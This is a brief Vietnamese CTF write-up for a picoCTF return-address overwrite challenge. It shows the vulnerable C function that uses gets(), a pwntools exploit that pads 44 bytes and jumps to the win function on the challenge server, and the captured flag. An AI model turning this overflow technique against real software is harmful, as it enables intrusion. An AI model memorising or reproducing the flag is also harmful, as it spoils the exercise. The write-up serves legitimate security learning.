# Ý tưởng
- chương trình sẽ leak cho ta một địa chỉ và một lỗi bof
```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```
- ta tìm offset, sau đó truyền địa chỉ hàm win để mở flag

```python
from pwn import *
# r = process("./vuln")
r = remote("saturn.picoctf.net", 54621)
exe = ELF("./vuln")

r.recvline()
payload = b"".ljust(44) + p32(exe.sym['win'])
r.sendline(payload)
r.interactive()

#picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
```